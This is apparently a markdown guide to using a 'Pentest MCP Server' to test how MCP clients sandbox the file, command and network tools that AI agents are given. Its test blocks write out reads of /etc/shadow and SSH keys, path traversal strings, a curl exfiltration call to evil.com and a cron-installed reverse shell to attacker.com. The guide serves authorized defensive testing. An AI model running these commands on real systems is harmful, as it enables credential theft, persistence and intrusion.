# Security Testing Guide

This document outlines how to use the Pentest MCP Server to test MCP client security implementations.

## ⚠️ LEGAL DISCLAIMER

**This tool is designed exclusively for authorized penetration testing and security research. Users must:**

- Obtain explicit written authorization before testing
- Only test systems they own or have permission to test
- Comply with all applicable laws and regulations
- Use findings for defensive purposes only
- Report vulnerabilities through responsible disclosure

## Attack Vectors to Test

### 1. File System Access Control

**Objective**: Test if the MCP client properly restricts file system access.

**Tests**:

```bash
# Test basic file enumeration
list-files --path="/" --recursive=true --showHidden=true

# Attempt to read sensitive files
read-file --filePath="/etc/passwd"
read-file --filePath="/etc/shadow"
read-file --filePath="/home/user/.ssh/id_rsa"
read-file --filePath="/var/log/auth.log"

# Path traversal attacks
read-file --filePath="../../../etc/passwd"
read-file --filePath="..\\..\\..\\windows\\system32\\config\\sam"

# Copy sensitive files
copy-file --source="/etc/passwd" --destination="/tmp/exfil_passwd"
```

**What to Look For**:

- Does the client restrict access to sensitive directories?
- Are path traversal attempts blocked?
- Can files be copied outside the intended workspace?

### 2. Command Execution Prevention

**Objective**: Verify that the client prevents arbitrary command execution.

**Tests**:

```bash
# Basic command execution
execute-command --command="whoami"
execute-command --command="id"
execute-command --command="pwd"

# System information gathering
execute-command --command="ps aux"
execute-command --command="netstat -tulpn"
execute-command --command="cat /proc/version"

# Privilege escalation attempts
execute-command --command="sudo -l"
execute-command --command="su root"

# Network operations
execute-command --command="nmap -sT localhost"
execute-command --command="curl http://evil.com/exfil"

# Persistence attempts
execute-command --command="echo '* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' | crontab -"
```

**What to Look For**:

- Are dangerous commands blocked or sandboxed?
- Can the attacker escalate privileges?
- Is network access restricted?

### 3. Data Exfiltration Detection

**Objective**: Test if the client monitors and prevents data exfiltration.

**Tests**:

```bash
# Monitor what data is collected
exfiltration-summary

# Attempt to gather comprehensive system info
system-info --includeEnv=true --includeProcesses=true --includeNetwork=true

# Read multiple files in sequence
read-file --filePath="/etc/hosts"
read-file --filePath="/etc/resolv.conf"
read-file --filePath="/proc/cpuinfo"
read-file --filePath="/proc/meminfo"
```

**What to Look For**:

- Does the client log file access attempts?
- Are there rate limits on file operations?
- Is sensitive data redacted or blocked?

### 4. Network Security Testing

**Objective**: Test network access restrictions and monitoring.

**Tests**:

```bash
# Port scanning
network-scan --host="127.0.0.1" --port=22
network-scan --host="127.0.0.1" --port=80
network-scan --host="internal.company.com" --port=443

# DNS enumeration
network-scan --host="google.com"
network-scan --host="internal.domain.com"
```

**What to Look For**:

- Can the server perform network reconnaissance?
- Are internal networks accessible?
- Is DNS resolution restricted?

## Client Security Best Practices

Based on testing, MCP clients should implement:

### 1. File System Sandboxing

- Restrict file access to designated workspace directories
- Implement path traversal protection
- Block access to sensitive system files
- Log all file access attempts

### 2. Command Execution Controls

- Disable or heavily sandbox command execution
- Implement command whitelisting
- Prevent privilege escalation
- Monitor for suspicious command patterns

### 3. Network Restrictions

- Limit network access to necessary services only
- Block internal network reconnaissance
- Implement DNS filtering
- Monitor outbound connections

### 4. Data Loss Prevention

- Monitor and log data access patterns
- Implement rate limiting on file operations
- Detect and prevent bulk data extraction
- Encrypt sensitive data in transit

### 5. Audit and Monitoring

- Log all MCP server interactions
- Monitor for suspicious tool usage patterns
- Implement alerting for security violations
- Maintain detailed audit trails

## Testing Methodology

### Phase 1: Reconnaissance

1. Connect to the MCP server
2. Enumerate available tools and resources
3. Identify potential attack vectors
4. Map the client's security boundaries

### Phase 2: Exploitation

1. Test file system access controls
2. Attempt command execution
3. Try data exfiltration techniques
4. Test network access restrictions

### Phase 3: Post-Exploitation

1. Assess data that was successfully accessed
2. Document security bypasses
3. Test persistence mechanisms
4. Evaluate lateral movement possibilities

### Phase 4: Reporting

1. Document all findings with evidence
2. Classify vulnerabilities by severity
3. Provide remediation recommendations
4. Create executive summary

## Example Test Scenarios

### Scenario 1: Corporate Environment

```bash
# Simulate corporate penetration test
system-info --includeEnv=true --includeProcesses=true
list-files --path="/home" --recursive=true
read-file --filePath="/etc/passwd"
execute-command --command="ps aux | grep -i sql"
network-scan --host="192.168.1.1" --port=445
```

### Scenario 2: Development Environment

```bash
# Test development workspace security
list-files --path="." --recursive=true --showHidden=true
read-file --filePath=".env"
read-file --filePath="config/database.yml"
execute-command --command="git log --oneline -10"
execute-command --command="npm list"
```

### Scenario 3: Cloud Environment

```bash
# Test cloud metadata access
execute-command --command="curl http://169.254.169.254/latest/meta-data/"
read-file --filePath="/proc/self/environ"
execute-command --command="env | grep -i aws"
network-scan --host="169.254.169.254" --port=80
```

## Automated Testing

Use the provided test client for automated security testing:

```bash
# Run basic security tests
node test-client/simple-test.js

# Check server status and exfiltration data
curl http://localhost:3000/health
curl http://localhost:3000/exfil
```

## Remediation Guidelines

### High Priority Fixes

1. Implement strict file system sandboxing
2. Disable or restrict command execution
3. Add comprehensive audit logging
4. Implement network access controls

### Medium Priority Fixes

1. Add rate limiting to prevent abuse
2. Implement data classification and protection
3. Add user permission controls
4. Enhance monitoring and alerting

### Low Priority Fixes

1. Improve error message security
2. Add session management controls
3. Implement resource usage limits
4. Enhance documentation

## Compliance Considerations

Ensure testing activities comply with:

- SOC 2 Type II requirements
- ISO 27001 standards
- GDPR data protection requirements
- Industry-specific regulations (HIPAA, PCI-DSS, etc.)

## Conclusion

Regular security testing of MCP implementations is crucial for maintaining a secure AI development environment. This pentest server provides a comprehensive toolkit for identifying and addressing security vulnerabilities in MCP client implementations.

Remember: The goal is to improve security, not to exploit vulnerabilities maliciously. Always follow responsible disclosure practices and work with development teams to address identified issues.
